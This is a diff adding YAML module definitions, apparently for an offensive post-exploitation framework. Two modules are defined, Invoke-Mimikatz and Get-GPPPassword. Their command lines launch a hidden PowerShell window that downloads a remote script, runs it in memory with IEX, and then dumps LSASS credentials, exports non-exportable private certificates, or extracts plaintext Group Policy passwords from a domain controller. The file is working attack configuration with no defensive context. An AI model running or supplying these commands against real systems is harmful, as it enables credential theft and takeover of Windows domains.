@@ -1,0 +1,49 @@
+powershell:
+  -
+    name: Invoke-Mimikatz
+    arch: x64
+    privilege: true
+    author: "Russel Van Tuyl (@Ne0nd0g)"
+    description: "Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any functionality provided with Mimikatz."
+    cmd: "powershell.exe -nop -WindowStyle 0 IEX (New-Object Net.WebClient).DownloadString($url$);Invoke-Mimikatz {{DumpCreds.Flag}} {{DumpCerts.Flag}} {{Command.Value}} {{ComputerName.Value}}"
+    options:
+      -
+        name: DumpCreds
+        value: true
+        required: false
+        flag: -DumpCreds
+        description: "[Switch]Use mimikatz to dump credentials out of LSASS."
+      -
+        name: DumpCerts
+        value: null
+        required: false
+        flag: -DumpCerts
+        description: "[Switch]Use mimikatz to export all private certificates (even if they are marked non-exportable)."
+      -
+        name: Command
+        value: null
+        required: false
+        flag: -Command
+        description: "Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz \"privilege::debug exit\" as an example."
+      -
+        name: ComputerName
+        value: null
+        required: false
+        flag: -ComputerName
+        description: "Optional, an array of computernames to run the script on."
+
+  -
+    name: Get-GPPPassword
+    arch: x64
+    privilege: true
+    author: "Chris Campbell (@obscuresec)"
+    description: "Get-GPPPassword searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords."
+    cmd: "powershell.exe -nop -WindowStyle 0 IEX (New-Object Net.WebClient).DownloadString($url$);Get-GPPPassword {{Server.Value}}"
+    options:
+      -
+        name: Server
+        value: null
+        required: false
+        flag: -Server
+        description: "Set the target server."
+      
